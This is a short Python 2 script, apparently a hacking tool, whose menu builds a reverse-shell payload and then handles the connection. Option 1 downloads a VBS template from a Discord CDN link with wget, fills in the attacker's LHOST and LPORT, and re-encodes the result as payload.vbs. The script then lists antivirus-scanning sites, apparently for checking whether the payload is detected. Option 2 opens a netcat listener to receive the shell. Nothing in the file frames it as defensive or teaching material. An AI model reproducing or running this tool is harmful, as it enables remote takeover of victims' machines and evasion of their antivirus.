#!/usr/bin/python
# -*- coding: utf8 -*-

import os
from select import select
from time import sleep 
import sys

def color(string, color=None):
    attr = []
    attr.append('1')
    
    if color:
        if color.lower() == "red":
            attr.append('31')
        elif color.lower() == "green":
            attr.append('32')
        elif color.lower() == "blue":
            attr.append('34')
        elif color.lower() == "yellow":
            attr.append('33')
        return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
def arquivo(filename, old_string, new_string):
    with open(filename) as f:
        s = f.read()
        if old_string not in s:
            print ('erro').format(**locals())
            
    
    with open(filename, 'w') as f:
        s = s.replace(old_string, new_string)
        f.write(s)

def convert(filename):
    with open(filename, 'rb') as source_file:
        with open("payload.vbs", 'w+b') as dest_file:
            contents = source_file.read()
            dest_file.write(contents.decode('utf-8').encode('utf-16'))
            os.system("rm "+filename)

def horas():
    os.system("clear")
    print color ("  Hours         Date","green")
    os.system(' date +"  %R      %D" ')

selec = 0
while selec != 3:
    horas()
    print color("""

    ░█▀▀▄░░░░░░░░░░░▄▀▀█
    ░█░░░▀▄░▄▄▄▄▄░▄▀░░░█
    ░░▀▄░░░▀░░░░░▀░░░▄▀
    ░░░░▌░▄▄░░░▄▄░▐▀▀
    ░░░▐░░█▄░░░▄█░░▌▄▄▀▀▀▀█
    ░░░▌▄▄▀▀░▄░▀▀▄▄▐░░░░░░█
    ▄▀▀▐▀▀░▄▄▄▄▄░▀▀▌▄▄▄░░░█
    █░░░▀▄░█░░░█░▄▀░░░░█▀▀▀
    ░▀▄░░▀░░▀▀▀░░▀░░░▄█▀
    ░░░█░░░░░░░░░░░▄▀▄░▀▄
    ░░░█░░░░░░░░░▄▀█░░█░░█
    ░░░█░░░░░░░░░░░█▄█░░▄▀
    ░░░█░░░░░░░░░░░████▀
    ░░░▀▄▄▀▀▄▄▀▀▄▄▄█▀

            Welcome

    ""","green")
    sleep(1.0)
    print color(" [1] Create shell payload","blue")
    sleep(1.0)
    print color(" [2] NetCat Connection","blue")
    sleep(1.0)
    print color(" [3] Exit","blue")
    sleep(1.0)
    print("")
    selec = int(input(color("select: ","yellow")))
    if selec == 1:
        print("")
        lhost = raw_input(color("LHOST: ","red"))
        print("")
        lport = raw_input(color("LPORT: ","red"))
        os.system("wget https://cdn.discordapp.com/attachments/936479788699369544/937833820474970162/loading.vbs > /dev/null 2>&1")
        arquivo("loading.vbs","LHOST",lhost)
        arquivo("loading.vbs","LPORT",lport)
        convert("loading.vbs")
        print("")
        print color("sites to scan:","green")
        print color("""
        https://virusscan.jotti.org
        https://www.antiscan.me
        ""","yellow")
        print color("saved in: ","green")
        os.system("echo $(pwd)/payload.vbs")
        sleep(1)
        print("")
        enter = raw_input(color("Enter to continue...","red"))
    elif selec == 2:
        ncport = raw_input(color("NetCatPort: ","blue"))
        print("")
        os.system("nc -nvlp "+ncport)
    elif selec == 3:
        os.system("clear")
    else:
        horas()

sleep(1)